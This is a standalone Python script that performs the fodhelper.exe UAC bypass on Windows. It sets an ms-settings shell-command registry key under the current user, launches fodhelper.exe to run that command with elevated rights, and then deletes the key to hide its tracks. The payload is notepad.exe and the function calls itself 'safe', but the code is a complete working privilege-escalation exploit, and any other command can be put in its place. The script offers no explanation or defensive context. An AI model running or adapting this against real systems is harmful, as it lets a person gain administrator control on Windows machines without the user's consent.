import os
import sys
import ctypes
import winreg
import time

def uac_bypass_safe():
    key_path = r"Software\Classes\ms-settings\shell\open\command"
    try:
        key = winreg.CreateKey(winreg.HKEY_CURRENT_USER, key_path)
        winreg.SetValueEx(key, None, 0, winreg.REG_SZ, "notepad.exe")
        winreg.SetValueEx(key, "DelegateExecute", 0, winreg.REG_SZ, "")
        winreg.CloseKey(key)

        print("[*] Launching fodhelper.exe to trigger UAC bypass...")
        os.system("start fodhelper.exe")

        time.sleep(2)

        winreg.DeleteKey(winreg.HKEY_CURRENT_USER, key_path)
        print("[+] Cleaned up registry. Done.")

    except Exception as e:
        print(f"[!] Failed: {e}")

if __name__ == "__main__":
    if ctypes.windll.shell32.IsUserAnAdmin():
        print("[+] Already running as admin.")
    else:
        print("[*] Attempting UAC bypass...")
        uac_bypass_safe()
